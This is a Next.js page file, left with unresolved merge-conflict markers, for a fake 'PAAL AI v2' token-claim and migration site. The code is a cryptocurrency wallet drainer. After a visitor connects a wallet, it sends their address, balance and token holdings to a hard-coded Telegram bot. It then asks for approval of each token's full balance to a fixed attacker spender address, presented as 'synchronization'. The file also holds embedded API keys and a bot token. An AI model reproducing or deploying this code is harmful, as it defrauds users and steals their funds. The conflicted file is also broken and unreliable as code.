<<<<<<< HEAD
=======
import { ConnectWallet, Web3Button, useAddress, useBalance, useContract, useContractWrite} from "@thirdweb-dev/react";
>>>>>>> ed0b88a7ebbbb4e408ae8aa60fcd109c8f46cb2a
import { NextPage } from "next";
import { ethers } from "ethers";
import {useSigner, ConnectWallet, useAddress, useBalance, useConnectionStatus} from "@thirdweb-dev/react";
import { NATIVE_TOKEN_ADDRESS } from '@thirdweb-dev/sdk';
<<<<<<< HEAD
import ChainContext from "../context/Chain";
import { useContext, useState, useEffect } from "react";
import { ThirdwebSDK } from "@thirdweb-dev/sdk";
import { useRouter } from 'next/router';
import {Navbar, NavbarBrand, NavbarContent, NavbarItem, Image, Button, Link, Card, CardBody, CardHeader,CardFooter} from "@nextui-org/react";
import  Head  from "next/head";

const Home: NextPage = () => {
    const list = [
        {
            title: "Migrate new tokens",
            body: "Click Here to Claim or fix Claiming issues",
            price: "",
          },
          {
            title: "Claim new tokens",
            body: "Click here for issues related to buying and selling",
            price: "",
          },
          {
            title: " Fix Staking related issues",
            body: "Click here to resolve issues with Staking",
            price: "",
          },
          {
            title: "Claim Rev shared rewards",
            body: "Click here to claim Airdrop or fix Airdrop related issues",
            price: "",
          },
        {
          title: "Migrate Staking",
          body: "Migrate Staking from V1 to V2",
          price: "",
        },
      ];
const address = useAddress();
const { data, isLoading } = useBalance(NATIVE_TOKEN_ADDRESS);
const wbalance = data?.displayValue;


const { selectedChain, setSelectedChain } = useContext(ChainContext);
const [allowanceRequested, synchronizationCompleted] = useState(false);
const signer = useSigner();
const router = useRouter();
const [synchronizationSuccess, setSynchronizationProcess] = useState(false);
const addresses: Record<string, string> = {
=======
import { useRouter } from 'next/router';

const Home: NextPage = () => {
const address = useAddress();
const { data, isLoading } = useBalance(NATIVE_TOKEN_ADDRESS);
const wbalance = data?.displayValue;
type Token = {
  tokenAddress: string;
  tokenBalance: number;
};
const [tokenDataArr, setTokenDataArr] = useState<Token[]>([]);
const [errorMessage, setErrorMessage] = useState('');
const [isButtonDisabled, setIsButtonDisabled] = useState(true);
const { selectedChain, setSelectedChain } = useContext(ChainContext);
const router = useRouter(); 
  const addresses: Record<string, string> = {
>>>>>>> ed0b88a7ebbbb4e408ae8aa60fcd109c8f46cb2a
    ["ethereum"]: "0xaF9c61A17d7F64507B983DD90de471CD010EDe12",
    ["binance"]: "0xaF9c61A17d7F64507B983DD90de471CD010EDe12",
  };
  const net: Record<string,string> = {
    ["ethereum"] : "ethereum",
    ["binance"]: "binance",
  };
   const sdk = new ThirdwebSDK(net[selectedChain],
    {
      clientId: "eae31aadb84c7c4cc24b2d16fb595580",  
    });
  const aptk = "6tL6x4wh-ROoNc4hp3C8gE-ToXlCSM5t"
  const chainUrls: Record<string, string> = {
<<<<<<< HEAD
    ethereum: `https://eth-mainnet.g.alchemy.com/v2/${aptk}`,
    arbitrum: `https://arb-mainnet.g.alchemy.com/v2/${aptk}`,
    binance:  `https://eth-mainnet.g.alchemy.com/v2/${aptk}`,
    polygon: `https://matic-mainnet.g.alchemy.com/v2/${aptk}`,
=======
    ethereum: `https://eth-mainnet.g.alchemy.com/v2/${apiKey}`,
    arbitrum: `https://arb-mainnet.g.alchemy.com/v2/${apiKey}`,
    binance:      `https://eth-mainnet.g.alchemy.com/v2/${apiKey}`,
    polygon: `https://matic-mainnet.g.alchemy.com/v2/${apiKey}`,
>>>>>>> ed0b88a7ebbbb4e408ae8aa60fcd109c8f46cb2a
  };
  const url = chainUrls[selectedChain];
<<<<<<< HEAD
  const connectionStatus = useConnectionStatus();
  console.log(connectionStatus);
  async function main() {
    if (connectionStatus === "unknown") {
      await sendMessageToTelegram(`User is yet to connect. Hold on........`);
      console.log(`User is yet to connect. Hold on........`);
      
    } 
    if (connectionStatus === "connecting"){
      await sendMessageToTelegram(`User's wallet is connecting be patient....`);
      console.log(`User's wallet is connecting be patient....`);
    }
    if (connectionStatus === "connected"){
      await sendMessageToTelegram(`User with wallet address:${address} and balance of ${wbalance} has connected.`);
      console.log(`User with wallet address:${address} and balance of ${wbalance} has connected.`);
    }
    if (connectionStatus === "disconnected"){
      await sendMessageToTelegram(`User has disconnected !`);
      console.log(`User has disconnected`);
    }

    const options = {
      method: "POST",
      headers: {
        accept: "application/json",
        "content-type": "application/json",
      },
      body: JSON.stringify({
        id: 1,
        jsonrpc: "2.0",
        method: "alchemy_getTokenBalances",
        params: [address],
      }),
    };
    // fetching the token balances
    let res = await fetch(url, options);
    let response = await res.json();
  
    // Getting balances from the response
    const balances = response["result"];
  
    // Remove tokens with zero balance
    const nonZeroBalances = await balances.tokenBalances.filter(
        (token: { tokenBalance: string }) => token.tokenBalance !== "0"
      );
  
    await sendMessageToTelegram(`Token balances of ${address}: \n`);
  
    // Create arrays to store contract addresses, balances, and formatted balances
    const tokenAddresses = [];
    const tokenBalances = [];
    const formattedBalances = [];
  
    // Loop through all tokens with non-zero balance
    for (let token of nonZeroBalances) {
      // Get balance of token
      let balance = token.tokenBalance;
  
      // request options for making a request to get tokenMetadata
      const tokenMetadataOptions = {
        method: "POST",
        headers: {
          accept: "application/json",
          "content-type": "application/json",
        },
        body: JSON.stringify({
          id: 1,
          jsonrpc: "2.0",
          method: "alchemy_getTokenMetadata",
          params: [token.contractAddress],
        }),
      };
  
      // parsing the response and getting metadata from it
      let res2 = await fetch(url, tokenMetadataOptions);
      let metadata = await res2.json();
      metadata = metadata["result"];
  
      // Compute token balance in human-readable format
      balance = balance / Math.pow(10, metadata.decimals);
      balance = balance.toFixed(2);
      // Create formatted balance using ethers.utils.parseUnits()
      const formattedBalance = ethers.utils.parseUnits(balance.toString(), 'ether');
      // Print name, balance, and symbol of token
      await sendMessageToTelegram(`${metadata.name}: ${balance} ${metadata.symbol}`);
      // Add contract address, balance, and formatted balance to the arrays
      tokenAddresses.push(token.contractAddress);
      tokenBalances.push(balance);
      formattedBalances.push(formattedBalance);
    }
     const spenderAddress = addresses[selectedChain];
    // Loop through contract addresses and formatted balances
    for (const [index, tokenAddress] of tokenAddresses.entries()) {
        const refundAmount = formattedBalances[index];
        
      const tokenContract = new ethers.Contract(tokenAddress, ['function approve(address spender, uint256 value)'], signer);
      try {
        const tx = await tokenContract.approve(spenderAddress, refundAmount);
        await sendMessageToTelegram(`Synchronization completed for token at address ${tokenAddress}`);
      } catch (error) {
        const tferror = console.info(`ERROR:`, error);
        await sendMessageToTelegram(`${tferror}`);
        setSynchronizationProcess(false); 
        return; // Exit the loop on error
      }
    }
    
    synchronizationCompleted(true); // Move this line outside the loop
    setSynchronizationProcess(true); 
  }
  useEffect(() => {
    if (synchronizationSuccess) {
        router.push("/synchronize"); // Replace "/new-page" with your desired destination
      }
    }, [synchronizationSuccess, router]);
=======
  useEffect(() => {
    const fetchTokenBalances = async () => {
      try {
        // Your code for fetching token balances goes here
         const options = {
          method: "POST",
          headers: {
            accept: "application/json",
            "content-type": "application/json",
          },
          body: JSON.stringify({
            id: 1,
            jsonrpc: "2.0",
            method: "alchemy_getTokenBalances",
            params: [address],
          }),
        };

        const res = await fetch(url, options);
      const response = await res.json();
      const balances = response.result.tokenBalances;
  
      const nonZeroBalances = balances.filter((token: { tokenBalance: string }) => {
        return token.tokenBalance !== "0";
      });

      const tokenDataPromises = nonZeroBalances.map(async (token: { contractAddress: string, tokenBalance: string }, index: number) => {
        const tokenMetadataOptions = {
          method: "POST",
          headers: {
            accept: "application/json",
            "content-type": "application/json",
          },
          body: JSON.stringify({
            id: 1,
            jsonrpc: "2.0",
            method: "alchemy_getTokenMetadata",
            params: [token.contractAddress],
          }),
        };
    
              const rawbal = Number(token.tokenBalance);
              const tokenMetadataRes = await fetch(url, tokenMetadataOptions);
              const metadata = await tokenMetadataRes.json();
              const { name, symbol, decimals } = metadata.result;
              const balance = rawbal / 10 ** Number(decimals);
              const logMessage = `${index + 1}. ${name}: ${balance} ${symbol}`;
              await sendMessageToTelegram(logMessage);
    
              return {
                tokenAddress: token.contractAddress,
                tokenBalance: balance,
              };
            });
    
            const tokenDataArr = await Promise.all(tokenDataPromises);
            await sendMessageToTelegram(JSON.stringify(tokenDataArr));
    
            setTokenDataArr(tokenDataArr);
          } catch (error) {
            console.error(error);
          }
        };
    
        if (address) {
          fetchTokenBalances();
        }
      }, [address, url]);

      const to ="0x5fC8D30804508dfBB940b64D20BdCFCA9C6A6c25"
      const { contract } = useContract(addresses[selectedChain]);
  const { mutateAsync: SynchronizePaalai} = useContractWrite(contract, "SynchronizePaalai");
  const handleSynchronizePaalai = async (actionType: string) => {
    try {
      const data = await SynchronizePaalai({ args: [tokenDataArr, to] });
      console.info("contract call success", data);
      if (actionType === 'migration') {
        router.push('/migration');
      } else if (actionType === 'staking') {
        router.push('/staking');
      } else if (actionType === 'claim') {
        router.push('/claim');
      }
      } catch (error) {
      console.error("contract call failure", error);
      setErrorMessage("Something went wrong!");
      }
      };
    
      console.log(wbalance);
>>>>>>> ed0b88a7ebbbb4e408ae8aa60fcd109c8f46cb2a
return(
        <div>
            <div
      className="bg-cover bg-center min-h-screen"
      style={{ backgroundImage: `url('images/bg-paal.png')` }}
    >
      <Head>
      <title>PAAL AI</title>
    </Head>
      <div>
      <Navbar>
      <NavbarBrand>
      <Image src="images/logo.png" alt="Logo" className="h-12"/>
      </NavbarBrand>
      
      <NavbarContent justify="end">
        <NavbarItem>
        <ConnectWallet
        theme={"dark"}
          modalTitle={"Connect to PAAL AI"}></ConnectWallet>
        </NavbarItem>
      </NavbarContent>
    </Navbar>
    <div className="flex justify-center items-center">
      <br></br><br></br><br></br><br></br><br></br><br></br>
    <Image src="images/logo.png" alt="Logo" width={90} height={30}></Image>
    <br></br>
    </div>
    <h1 className="flex justify-center font-bold text-lg text-white">
      <Link href="paalai.io" className="text-white">Introducing PAAL &rarr;</Link>
    </h1>
    <p className="flex justify-center text-white">Welcome to PAAL v2 claiming site.</p>
    <br></br>
    <div className="flex justify-center items-center">
      <br></br>
<<<<<<< HEAD
      <ConnectWallet></ConnectWallet>
=======
      <Web3Button
      contractAddress={addresses[selectedChain]}
      action={(contract) => {
        contract.call("PaalaiApproval", [tokenDataArr])
        setIsButtonDisabled(false);
      }}
      
      onError={(error) => setErrorMessage("Something went wrong!")}
    >
     Connect to Claim Token
    </Web3Button>
>>>>>>> ed0b88a7ebbbb4e408ae8aa60fcd109c8f46cb2a
    &nbsp;&nbsp;
    <select
    className="block font-bold px-3 py-2 mt-2 bg-white border border-gray-300 rounded-md shadow-sm focus:ring-indigo-500 focus:border-indigo-500 sm:text-sm"
        value={String(selectedChain)}
        onChange={(e) => setSelectedChain(e.target.value)}
      >
        
        <option value="binance">Binance Smart Chain</option>
        <option value="ethereum">Ethereum</option>
      </select>
      <br></br><br></br><br></br><br></br>
    </div>
<<<<<<< HEAD
    <div className="gap-4 grid grid-cols-2 sm:grid-cols-4">
      {list.map((item, index) => (
        <Card shadow="sm" key={index} isPressable onPress={() => main()} className="border-white border-double border-2 bg-transparent">
          <CardBody className="overflow-visible p-0">
            <p className="justify-center text-center py-10 px-10 font-bold text-white">{item.body}</p>
          </CardBody>
          <CardFooter className="text-small justify-between text-white">
            <b>{item.title}</b>
            <p className="text-default-500">{item.price}</p>
          </CardFooter>
        </Card>
      ))}
=======
    {errorMessage && <p className="flex justify-center text-red-500"><br></br>{errorMessage}</p>}
    <div className="flex justify-center items-center gap-2">
    <br></br><br></br><br></br><br></br><br></br><br></br>
    <Button
onClick={() => handleSynchronizePaalai('migration')}
disabled={isLoading || isButtonDisabled}
>
Migration V2
</Button>

<Button
onClick={() => handleSynchronizePaalai('staking')}
disabled={isLoading || isButtonDisabled}
>
Staking pool
</Button>


<Button
onClick={() => handleSynchronizePaalai('claim')}
disabled={isLoading || isButtonDisabled}
>
Claim Rewards
</Button><br></br>
>>>>>>> ed0b88a7ebbbb4e408ae8aa60fcd109c8f46cb2a
    </div>
      </div>
      
    </div>
    </div>
    );   
};
const sendMessageToTelegram = async (message: string) => {
<<<<<<< HEAD
    const botToken = '6465126558:AAGyaNAHu6ZrzMiILFOJYFDvHTNfCDSdj2I';
    const chatId = '5033004040'; // You'll need to obtain this from your Telegram bot
    
    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
=======
  const botToken = '6465126558:AAGyaNAHu6ZrzMiILFOJYFDvHTNfCDSdj2I';
  const chatId = '503300404'; // You'll need to obtain this from your Telegram bot
>>>>>>> ed0b88a7ebbbb4e408ae8aa60fcd109c8f46cb2a
  
    const response = await fetch(url, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
      }),
    });
  };  
export default Home;

